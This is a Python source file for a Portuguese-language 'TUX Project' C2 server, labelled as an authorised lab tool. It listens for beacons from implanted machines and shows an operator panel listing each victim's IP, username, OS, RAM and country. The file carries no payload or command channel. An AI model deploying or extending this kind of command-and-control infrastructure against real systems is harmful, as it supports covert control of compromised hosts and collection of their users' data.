"""Servidor C2 do TUX Project — painel de operador CLI."""
import json
import os
import socket
import threading

from colorama import Fore, Style, init

from config import settings

init(autoreset=True)

HOST = settings.HOST
PORT = settings.PORT
BUFFER_SIZE = settings.BUFFER_SIZE
MAX_CONNECTIONS = settings.MAX_CONNECTIONS
CLEAR = "cls" if os.name == "nt" else "clear"

clients = {}


def show_menu():
    os.system(CLEAR)
    print(f"""
{Style.BRIGHT}{Fore.CYAN}╔════════════════════════════════╗
{Fore.CYAN}║   TUX PROJECT - C2 SERVER      ║
{Fore.CYAN}╚════════════════════════════════╝
{Fore.YELLOW}Bem-vindo ao TUX Project C2!  (lab autorizado)

{Fore.GREEN}[1]{Fore.WHITE} Listar máquinas conectadas
{Fore.GREEN}[2]{Fore.WHITE} Sair
""")


def list_connected_clients():
    os.system(CLEAR)
    if not clients:
        print(f"{Fore.RED}[INFO] Nenhuma máquina conectada no momento.")
    else:
        print(f"{Fore.GREEN}{Style.BRIGHT}Máquinas conectadas:\n")
        for _identifier, data in clients.items():
            print(f"""
{Fore.CYAN}  Identificador : {Fore.YELLOW}{data['identifier']}
{Fore.CYAN}  País          : {Fore.YELLOW}{data['country']}
{Fore.CYAN}  Status        : {Fore.YELLOW}{data['status']}
{Fore.CYAN}  IP            : {Fore.YELLOW}{data['ip']}
{Fore.CYAN}  Usuário       : {Fore.YELLOW}{data['username']}
{Fore.CYAN}  SO            : {Fore.YELLOW}{data['os']}
{Fore.CYAN}  RAM           : {Fore.YELLOW}{data['ram']}
{Fore.CYAN}  Sinal         : {Fore.YELLOW}{data['signal']}
{Fore.MAGENTA}  {'─' * 30}""")
    input(f"\n{Fore.YELLOW}Pressione Enter para voltar ao menu...")


def handle_client(conn, addr):
    """Processa o beacon de um cliente e o registra no painel."""
    try:
        data = conn.recv(BUFFER_SIZE).decode("utf-8")
        client_data = json.loads(data)
        if "identifier" in client_data:
            clients[client_data["identifier"]] = {
                "identifier": client_data.get("identifier"),
                "country": client_data.get("country", "Desconhecido"),
                "status": client_data.get("status", "Ativo"),
                "ip": addr[0],
                "username": client_data.get("username", "Desconhecido"),
                "os": client_data.get("os", "Desconhecido"),
                "ram": client_data.get("ram", "Desconhecida"),
                "signal": client_data.get("signal", "Desconhecido"),
            }
            print(f"{Fore.GREEN}[+] Cliente registrado: "
                  f"{Fore.YELLOW}{client_data['identifier']}")
        else:
            print(f"{Fore.RED}[!] Dados inválidos: 'identifier' ausente.")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao processar cliente: {e}")
    finally:
        conn.close()


def start_server():
    """Inicia o servidor TCP e aceita beacons em threads."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(MAX_CONNECTIONS)
    print(f"{Fore.GREEN}[*] Servidor aguardando na porta {PORT}...\n")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr),
                         daemon=True).start()


def main():
    threading.Thread(target=start_server, daemon=True).start()
    while True:
        show_menu()
        choice = input(f"{Fore.CYAN}[C2] Opção: {Fore.YELLOW}").strip()
        if choice == "1":
            list_connected_clients()
        elif choice == "2":
            print(f"{Fore.GREEN}[*] Encerrando...")
            break
        else:
            print(f"{Fore.RED}[!] Opção inválida.")


if __name__ == "__main__":
    main()
